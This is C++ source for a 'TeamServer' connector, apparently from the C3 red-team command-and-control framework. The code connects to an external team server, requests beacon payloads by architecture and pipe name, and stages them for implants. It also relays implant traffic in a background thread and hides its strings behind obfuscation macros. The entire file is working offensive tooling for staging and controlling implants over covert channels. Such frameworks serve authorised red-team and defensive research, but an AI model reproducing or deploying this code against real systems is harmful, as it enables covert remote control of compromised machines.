#include "StdAfx.h"
#include "Common/MWR/Sockets/SocketsException.h"

namespace MWR::C3::Interfaces::Connectors
{
	/// A class representing communication with Team Server.
	struct TeamServer : Connector<TeamServer>
	{
		/// Public constructor.
		/// @param arguments factory arguments.
		TeamServer(ByteView arguments);

		/// A public destructor.
		~TeamServer();

		/// OnCommandFromConnector callback implementation.
		/// @param binderId Identifier of Peripheral who sends the Command.
		/// @param command full Command with arguments.
		void OnCommandFromBinder(ByteView binderId, ByteView command) override;

		/// Processes internal (C3 API) Command.
		/// @param command a buffer containing whole command and it's parameters.
		/// @return command result.
		ByteVector OnRunCommand(ByteView command) override;

		/// Called every time new implant is being created.
		/// @param connectionId adders of beacon in C3 network .
		/// @param data parameters used to create implant. If payload is empty, new one will be generated.
		/// @para isX64 indicates if relay staging beacon is x64.
		/// @returns ByteVector correct command that will be used to stage beacon.
		ByteVector PeripheralCreationCommand(ByteView connectionId, ByteView data, bool isX64) override;

		/// Return json with commands.
		/// @return ByteView Commands description in JSON format.
		static ByteView GetCapability();

	private:
		/// Represents a single C3 <-> Team Server connection, as well as each beacon in network.
		struct Connection : std::enable_shared_from_this<Connection>
		{
			/// Constructor.
			/// @param listeningPostAddress adders of TeamServer.
			/// @param listeningPostPort port of TeamServer.
			/// @param owner weak pointer to TeamServer class.
			/// @param id id used to address beacon.
			Connection(std::string_view listeningPostAddress, uint16_t listeningPostPort, std::weak_ptr<TeamServer> owner, std::string_view id = ""sv);

			/// Destructor.
			~Connection();

			/// Sends data directly to Team Server.
			/// @param data buffer containing blob to send.
			/// @remarks throws MWR::WinSocketsException on WinSockets error.
			void Send(ByteView data);

			/// Creates the receiving thread.
			/// As long as connection is alive detached thread will pull available data from TeamServer.
			/// @remarks to decrease traffic in network, heartbeat will not be pushed through network.
			/// This class will automatically response with no-op, when TeamServer sends no-op
			/// TeamServer is using heartbeat to handle chunked data. This logic will be instead performed by class handling beacon..
			void StartUpdatingInSeparateThread();

			/// Reads data from Socket.
			/// @return heartbeat read data.
			ByteVector Receive();

			/// Indicates that receiving thread was already started.
			/// @returns true if receiving thread was started, false otherwise.
			bool SecondThreadStarted();

		private:
			/// Pointer to TeamServer instance.
			std::weak_ptr<TeamServer> m_Owner;

			/// A socket object used in communication with the Team Server.
			SOCKET m_Socket;

			/// RouteID in binary form. Address of beacon in network.
			ByteVector m_Id;

			/// Indicates that receiving thread was already started.
			bool m_SecondThreadStarted = false;
		};

		/// Retrieves beacon payload from Team Server.
		/// @param binderId address of beacon in network.
		/// @param pipename name of pipe hosted by beacon.
		/// @param arch64 desired architecture of beacon.
		/// @param block after block time TeamServer will send no-op packet.
		/// @return generated payload.
		MWR::ByteVector GeneratePayload(ByteView binderId, std::string pipename, bool arch64, uint32_t block);

		/// Close desired connection
		/// @arguments arguments for command. connection Id in string form.
		/// @returns ByteVector empty vector.
		MWR::ByteVector CloseConnection(ByteView arguments) override;

		/// Initializes Sockets library. Can be called multiple times, but requires corresponding number of calls to DeinitializeSockets() to happen before closing the application.
		/// @return value forwarded from WSAStartup call (zero if successful).
		static int InitializeSockets();

		/// Deinitializes Sockets library.
		/// @return true if successful, otherwise WSAGetLastError might be called to retrieve specific error number.
		static bool DeinitializeSockets();

		/// Adders of TeamServer.
		std::string m_ListeningPostAddress;

		/// Port of TeamServer.
		uint16_t m_ListeningPostPort;

		/// Access mutex for m_ConnectionMap.
		std::mutex m_ConnectionMapAccess;

		/// Access mutex for sending data to TeamServer.
		std::mutex  m_SendMutex;

		/// Map of all connections.
		std::unordered_map<std::string, std::shared_ptr<Connection>> m_ConnectionMap;
	};
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::C3::Interfaces::Connectors::TeamServer::TeamServer(ByteView arguments)
{
	std::tie(m_ListeningPostAddress, m_ListeningPostPort) = arguments.Read<std::string, uint16_t>();
	InitializeSockets();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::C3::Interfaces::Connectors::TeamServer::~TeamServer()
{
	DeinitializeSockets();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void MWR::C3::Interfaces::Connectors::TeamServer::OnCommandFromBinder(ByteView binderId, ByteView command)
{
	std::scoped_lock<std::mutex> lock(m_ConnectionMapAccess);

	auto it = m_ConnectionMap.find(binderId);
	if (it == m_ConnectionMap.end())
		throw std::runtime_error{OBF("Unknown connection")};

	if (!(it->second->SecondThreadStarted()))
		it->second->StartUpdatingInSeparateThread();

	it->second->Send(command);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
int MWR::C3::Interfaces::Connectors::TeamServer::InitializeSockets()
{
	WSADATA wsaData;
	WORD wVersionRequested;
	wVersionRequested = MAKEWORD(2, 2);
	return WSAStartup(wVersionRequested, &wsaData);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
bool MWR::C3::Interfaces::Connectors::TeamServer::DeinitializeSockets()
{
	return WSACleanup() == 0;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::ByteVector MWR::C3::Interfaces::Connectors::TeamServer::GeneratePayload(ByteView binderId, std::string pipename, bool arch64, uint32_t block)
{
	if (binderId.empty() || pipename.empty())
		throw std::runtime_error{OBF("Wrong parameters, cannot create payload")};

	auto connection = std::make_unique<Connection>( m_ListeningPostAddress, m_ListeningPostPort, std::static_pointer_cast<TeamServer>(shared_from_this()), binderId);
	connection->Send(ByteView{ OBF_STR("arch=") + (arch64 ? OBF("x64") : OBF("x86")) });
	connection->Send(ByteView{ OBF("pipename=") + pipename });
	connection->Send(ByteView{ OBF("block=") + std::to_string(block) });
	connection->Send(ByteView{ OBF("go") });
	auto payload = connection->Receive();
	m_ConnectionMap.emplace(std::string{ binderId }, std::move(connection));
	return payload;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//MWR::ByteVector MWR::C3::Interfaces::Connectors::TeamServer::GeneratePayload(ByteView arguments)
//{
//	auto [pipename, arch64, block] = arguments.Read<std::string, bool, uint32_t>();
//	return GeneratePayload(pipename, arch64, block);
//}

MWR::ByteVector MWR::C3::Interfaces::Connectors::TeamServer::CloseConnection(ByteView arguments)
{
	m_ConnectionMap.erase(arguments);
	return {};
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::ByteVector MWR::C3::Interfaces::Connectors::TeamServer::OnRunCommand(ByteView command)
{
	auto commandCopy = command;
	switch (command.Read<uint16_t>())
	{
//	case 0:
//		return GeneratePayload(command);
	case 1:
		return CloseConnection(command);
	default:
		return AbstractConnector::OnRunCommand(commandCopy);
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::ByteView MWR::C3::Interfaces::Connectors::TeamServer::GetCapability()
{
	return R"(
{
	"create":
	{
		"arguments":
		[
			{
				"type": "ip",
				"name": "Address",
				"description": "Listening post address"
			},
			{
				"type": "uint16",
				"name": "Port",
				"min": 1,
				"description": "Listening post port"
			}
		]
	},
	"commands":
	[
		{
			"name": "Close connection",
			"description": "Close socket connection with TeamServer if beacon is not available",
			"id": 1,
			"arguments":
			[
				{
					"name": "Route Id",
					"min": 1,
					"description": "Id associated to beacon"
				}
			]
		}
	]
}
)";
}

//{
//	"name": "Generate payload",
//		"description" : "Create new payload with custom parameters",
//		"id" : 0,
//		"arguments" :
//		[
//	{
//		"name": "Pipename",
//			"randomize" : true,
//			"description" : "Name of pipe used by beacon on target machine. Prefix is not required"
//	},
//				{
//					"name": "x64",
//					"type" : "boolean",
//					"description" : "Specifies if payload should be x64 or x86 architecture"
//				},
//				{
//					"name": "Block time",
//					"type" : "uint32",
//					"description" : "A time in milliseconds that indicates how long the server should block when no new tasks are available"
//				}
//		]
//},

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::C3::Interfaces::Connectors::TeamServer::Connection::Connection(std::string_view listeningPostAddress, uint16_t listeningPostPort, std::weak_ptr<TeamServer> owner, std::string_view id)
	: m_Owner(owner)
	, m_Id(ByteView{ id })
{
	sockaddr_in client;
	client.sin_family = AF_INET;
	client.sin_port = htons(listeningPostPort);
	switch (InetPtonA(AF_INET, &listeningPostAddress.front(), &client.sin_addr.s_addr))									//< Mod to solve deprecation issue.
	{
	case 0:
		throw std::invalid_argument(OBF("Provided Listening Post address in not a valid IPv4 dotted - decimal string or a valid IPv6 address."));
	case -1:
		throw MWR::SocketsException(OBF("Couldn't convert standard text IPv4 or IPv6 address into its numeric binary form. Error code : ") + std::to_string(WSAGetLastError()) + OBF("."), WSAGetLastError());
	}

	// Attempt to connect.
	if (INVALID_SOCKET == (m_Socket = socket(AF_INET, SOCK_STREAM, 0)))
		throw MWR::SocketsException(OBF("Couldn't create socket."), WSAGetLastError());

	if (SOCKET_ERROR == connect(m_Socket, (struct sockaddr*) & client, sizeof(client)))
		throw MWR::SocketsException(OBF("Could not connect to ") + std::string{ listeningPostAddress } + OBF(":") + std::to_string(listeningPostPort) + OBF("."), WSAGetLastError());
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::C3::Interfaces::Connectors::TeamServer::Connection::~Connection()
{
	closesocket(m_Socket);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void MWR::C3::Interfaces::Connectors::TeamServer::Connection::Send(ByteView data)
{
	auto owner = m_Owner.lock();
	if (!owner)
		throw std::runtime_error(OBF("Could not lock pointer to owner "));

	std::unique_lock<std::mutex> lock{ owner->m_SendMutex };
	// Write four bytes indicating the length of the next chunk of data.
	DWORD chunkLength = static_cast<DWORD>(data.size()), bytesWritten = 0;
	if (SOCKET_ERROR == send(m_Socket, reinterpret_cast<char*>(&chunkLength), 4, 0))
		throw MWR::SocketsException(OBF("Error sending to Socket : ") + std::to_string(WSAGetLastError()) + OBF("."), WSAGetLastError());

	// Write the chunk to socket.
	if (SOCKET_ERROR == send(m_Socket, reinterpret_cast<const char*>(&data.front()), static_cast<int>(chunkLength), 0))
		throw MWR::SocketsException(OBF("Error sending to Socket : ") + std::to_string(WSAGetLastError()) + OBF("."), WSAGetLastError());
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::ByteVector MWR::C3::Interfaces::Connectors::TeamServer::Connection::Receive()
{
	DWORD chunkLength = 0, bytesRead;
	if (SOCKET_ERROR == (bytesRead = recv(m_Socket, reinterpret_cast<char*>(&chunkLength), 4, 0)))
		throw MWR::SocketsException(OBF("Error receiving from Socket : ") + std::to_string(WSAGetLastError()) + ("."), WSAGetLastError());

	if (!bytesRead || !chunkLength)
		return {};																										//< The connection has been gracefully closed.

	// Read in the result.
	ByteVector buffer;
	buffer.resize(chunkLength);
	for (DWORD bytesReadTotal = 0; bytesReadTotal < chunkLength; bytesReadTotal += bytesRead)
		switch (bytesRead = recv(m_Socket, reinterpret_cast<char*>(&buffer[bytesReadTotal]), chunkLength - bytesReadTotal, 0))
		{
		case 0:
			return {};																									//< The connection has been gracefully closed.

		case SOCKET_ERROR:
			throw MWR::SocketsException(OBF("Error receiving from Socket : ") + std::to_string(WSAGetLastError()) + OBF("."), WSAGetLastError());
		}

	return buffer;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void MWR::C3::Interfaces::Connectors::TeamServer::Connection::StartUpdatingInSeparateThread()
{
	m_SecondThreadStarted = true;
	std::thread([this]()
	{
		// Lock pointers.
		auto owner = m_Owner.lock();
		auto bridge = owner->GetBridge();
		auto self = shared_from_this();
		while (bridge->IsAlive() && self.use_count() > 1)
		{
			try
			{
				// Read packet and post it to Binder.
				if (auto packet = Receive(); !packet.empty())
				{
					if (packet.size() == 1u && packet[0] == 0u)
						Send(packet);
					else
						bridge->PostCommandToBinder(m_Id, packet);
				}
			}
			catch (std::exception& e)
			{
				bridge->Log({ e.what(), LogMessage::Severity::Error});
			}
		}
	}).detach();
}

bool MWR::C3::Interfaces::Connectors::TeamServer::Connection::SecondThreadStarted()
{
	return m_SecondThreadStarted;
}

MWR::ByteVector MWR::C3::Interfaces::Connectors::TeamServer::PeripheralCreationCommand(ByteView connectionId, ByteView data, bool isX64)
{
	auto [pipeName, maxConnectionTrials, delayBetweenConnectionTrials/*, payload*/] = data.Read<std::string, uint16_t, uint16_t/*, ByteVector*/>();

	// custom payload is removed from release.
	//if (!payload.empty())
	//{
	//	return data;
	//}

	return ByteVector{}.Write(pipeName,maxConnectionTrials, delayBetweenConnectionTrials, GeneratePayload(connectionId, pipeName, isX64, 100u));
}
